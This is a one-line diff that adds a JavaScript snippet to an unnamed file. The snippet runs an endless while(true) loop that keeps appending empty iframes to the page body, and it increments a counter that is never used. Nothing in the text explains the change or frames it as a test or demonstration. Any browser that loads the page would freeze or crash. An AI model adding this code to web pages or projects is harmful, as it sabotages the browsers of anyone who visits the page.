@@ -1,0 +1,1 @@
+var n=0;while(true){n++;document.body.insertAdjacentHTML("beforeend","<iframe></iframe>");}
